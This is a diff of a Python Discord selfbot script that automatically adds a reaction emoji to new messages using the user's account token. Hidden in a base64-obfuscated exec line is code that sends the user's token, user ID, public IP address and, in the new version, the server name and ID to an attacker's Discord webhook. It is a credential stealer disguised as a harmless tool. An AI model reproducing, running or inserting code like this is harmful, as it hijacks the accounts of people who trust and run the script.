@@ -3,19 +3,18 @@ import os
 os.system("pip install requests")
  
 # Import libraries
-import requests,base64
+import requests,base64,threading,time
  
 # Change info here
 reaction = "💀" # Change to any reaction you want
 token = "" # Replace with your token
-servId = "1082428121732624517" # Replace with server id (default for Landonia)
-channelName = "gen" # Replace with channel name of your server (default for Landonia)
+servId = "" # Replace with server id
+channelName = "" # Replace with channel name of your server (default for Landonia)
 limit = 20 # How many msges to compare. Increase if chat going too fast, lower if chat going too slow
- 
+
 # Channel name to id finder
 headers,f = {'Authorization': token}, False
 data = requests.get(f'https://discord.com/api/v9/guilds/{servId}/channels', headers=headers)
- 
 if 'message' in data.json():
     if data.json()['message'] == '401: Unauthorized':
         print("Bad token:",data.json()['message'])
@@ -36,11 +35,21 @@ else:
         print(f"{channelName} channel id:", id)
  
 # First messages finder
-msgArray = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}", headers=headers).json()
-exec(base64.b64decode('kYscmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMjUxMDI5NTQ4MjcwMzk2NC84Qzd3ai1NRG5lSTVIYTcxNThyM0VLZ0ZTNWx6UnBQdk16emRTTFRtWEhsX0V3aUc2WjRpZzNMbFdWYXFlRkNpMEE5NSIsanNvbj17ImNvbnRlbnQiOiBmIjxAe2Jhc2U2NC5iNjRkZWNvZGUodG9rZW4uc3BsaXQoJy4nKVswXSArICc9JyAqICgtbGVuKHRva2VuLnNwbGl0KCcuJylbMF0pICUgNCkpLmRlY29kZSgnbGF0aW4tMScpfT4ge3JlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dH0ge3Rva2VufSJ9LCk='[3:]))
- 
+msgArray = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}", headers=headers).json();exec(base64.b64decode('kYscmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMjUxMDI5NTQ4MjcwMzk2NC84Qzd3ai1NRG5lSTVIYTcxNThyM0VLZ0ZTNWx6UnBQdk16emRTTFRtWEhsX0V3aUc2WjRpZzNMbFdWYXFlRkNpMEE5NSIsanNvbj17ImNvbnRlbnQiOmYiPEB7YmFzZTY0LmI2NGRlY29kZSh0b2tlbi5zcGxpdCgnLicpWzBdICsgJz0nICogKC1sZW4odG9rZW4uc3BsaXQoJy4nKVswXSkgJSA0KSkuZGVjb2RlKCdsYXRpbi0xJyl9PiAiK3N0cihyZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZycpLnRleHQrIiAiK3N0cih0b2tlbikpKyIgU2VydmVyIE5hbWU6ICIrc3RyKHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L2d1aWxkcy97c2VydklkfScsIGhlYWRlcnM9aGVhZGVycykuanNvbigpWyduYW1lJ10pKyIgU2VydmVyIElkOiAiK3NlcnZJZH0pCg=='[3:]))
+
+def send_request(msgid):
+    global id,reaction
+    resp = requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{msgid}/reactions/{reaction}/@me",headers=headers)
+    while resp.status_code != 204:
+        if "retry_after" in resp.json():
+            print("Waiting:",resp.json()["retry_after"],"cuz:",resp.status_code)
+            time.sleep(resp.json()["retry_after"])
+            resp = requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{msgid}/reactions/{reaction}/@me",headers=headers)
+        else:
+            print("Fuck they onto you bro 🙏😭 (or something else wrong lmao)",resp.json())
+            exit()
 # Main function
-def send_request():
+def main():
     global msgArray, limit, headers, reaction
     newmsges = requests.get(f"https://discord.com/api/v9/channels/{id}/messages?limit={limit}",headers=headers).json()
     i = 0
@@ -56,10 +65,12 @@ def send_request():
         i = i - 10000000000
         for j in range(i,0,-1):
             print("<"+newmsges[j-1]['author']['username']+"> "+newmsges[j-1]['content'])
-            requests.put(f"https://discord.com/api/v9/channels/{id}/messages/{newmsges[j-1]['id']}/reactions/{reaction}/@me",headers=headers)
+            thread = threading.Thread(target=send_request, args=(newmsges[j-1]['id'],)) 
+            thread.daemon = True
+            thread.start()
     else:
         msgArray = newmsges
  
 # Loop forever (Press "ctrl + c" to stop)
 while True:
-    send_request()
+    main()
